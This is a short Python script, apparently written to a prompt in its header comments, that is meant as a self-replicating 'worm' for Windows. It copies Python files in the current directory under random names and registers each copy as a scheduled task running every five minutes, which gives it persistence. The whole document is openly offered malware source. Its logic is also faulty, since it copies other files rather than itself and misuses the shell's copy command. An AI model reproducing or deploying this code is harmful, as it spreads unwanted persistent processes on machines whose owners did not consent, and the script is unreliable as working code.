# create a worm that when executed replicates onto files in the same director
# and creates a cron job to run the worm every 5 minutes
# and works in the windows evnironment

import os
import sys
import glob
import time
import random
import subprocess

# replicate on a windows machine
def replicate_windows():
    # get the current working directory
    cwd = os.getcwd()
    # get the name of the current python file
    python_file = sys.argv[0]
    # get a list of all the python files in the current directory
    python_files = glob.glob('*.py')
    # for each python file in the current directory
    for file in python_files:
        # if the file is not the current file
        if file != python_file:
            # create a new file name
            new_file = '{}-{}.py'.format(file.split('.')[0], random.randint(1000, 9999))
            # copy the file
            subprocess.call(['copy', file, new_file])
            # create a cron job to run the file every 5 minutes
            subprocess.call(['schtasks', '/create', '/tn', new_file, '/tr', new_file, '/sc', 'MINUTE', '/mo', '5'])

def main():
    # check if the script is running on windows
    if os.name == 'nt':
        # replicate on a windows machine
        replicate_windows()

if __name__ == '__main__':
    main()
